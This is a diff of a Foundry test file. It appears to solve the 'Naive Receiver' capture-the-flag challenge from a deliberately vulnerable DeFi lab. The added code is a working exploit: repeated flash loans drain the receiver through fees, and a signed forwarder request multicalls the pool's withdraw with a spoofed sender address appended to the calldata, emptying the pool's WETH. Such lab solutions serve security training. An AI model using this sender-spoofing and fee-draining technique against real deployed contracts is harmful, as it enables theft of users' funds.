@@ -4,10 +4,10 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
-import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
+import {FlashLoanReceiver, IERC3156FlashBorrower} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
 
-contract NaiveReceiverChallenge is Test {
+contract NaiveReceiverChallenge is Test, IERC3156FlashBorrower {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
     address player;
@@ -77,7 +77,38 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes[] memory data = new bytes[](11);
+        for (uint256 i = 0; i < 10; i++) {
+            data[i] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, address(weth), 1 ether, "");
+        }
+        data[10] = abi.encodePacked(abi.encodeWithSelector(pool.withdraw.selector, 1010 ether, recovery), deployer);
+
+        BasicForwarder.Request memory req = BasicForwarder.Request({
+            from: player, 
+            target: address(pool), 
+            value: 0, 
+            gas: 1e10, 
+            nonce: 0, 
+            data: abi.encodeWithSelector(pool.multicall.selector, data), 
+            deadline: 1 days
+        });
+        bytes32 structHash = forwarder.getDataHash(req);
+        bytes32 digset = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), structHash));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digset);
+        bytes memory sig = abi.encodePacked(r, s, v);
+
+        forwarder.execute(req, sig);
+    }
+
+    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata)
+        external
+        returns (bytes32)
+    {
+        console.log("msg.senderrrrrrrrrrrrrrrrrrrrrr: ", msg.sender);
+        pool.withdraw(1 ether, payable(recovery));
+
+        weth.approve(address(pool), 2 ether);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 
     /**
